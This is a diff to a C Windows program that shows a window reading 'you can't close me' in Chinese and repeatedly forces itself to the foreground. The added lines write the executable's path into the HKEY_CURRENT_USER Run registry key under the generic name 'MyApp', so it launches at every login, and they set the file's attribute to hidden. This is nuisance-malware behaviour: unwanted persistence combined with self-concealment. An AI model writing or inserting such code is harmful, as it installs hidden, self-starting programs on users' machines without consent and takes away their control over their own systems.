@@ -68,7 +68,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 
             // 绘制文本
             SetBkMode(hdc, TRANSPARENT);  // 设置背景模式为透明，确保文本背景不会被绘制
-            // 不用系统会乱码
+            // 系统会乱码
             // DrawText(hdc, "你关不了我,(¬◡¬)✧(¬◡¬ )✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
             DrawTextW(hdc, L"你关不了我,(¬◡¬)✧(¬◡¬)✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
@@ -113,6 +113,26 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 
 
 int main() {
+
+    // 开机自启动
+    // 获取当前可执行文件路径
+    char exePath[MAX_PATH];
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+
+    // 打开注册表项
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+
+    // 设置注册表项的值
+    RegSetValueEx(hKey, "MyApp", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
+
+    // 关闭注册表项
+    RegCloseKey(hKey);
+    // 将文件属性设置为隐藏
+    SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);
+
+
+
     // 注册窗口类
     WNDCLASS wc = {0};
     wc.lpfnWndProc = WindowProc;    // WindowProc 是一个回调函数，用于处理窗口消息的函数。
@@ -160,6 +180,7 @@ int main() {
             // SetWindowPos(hwnd, NULL, rand()%(screen_width-200), rand()%(screen_height-100), 200, 100, SWP_NOZORDER | SWP_NOSIZE);
             SetForegroundWindow(hwnd);
             SetFocus(hwnd);
+
         }
     }
 
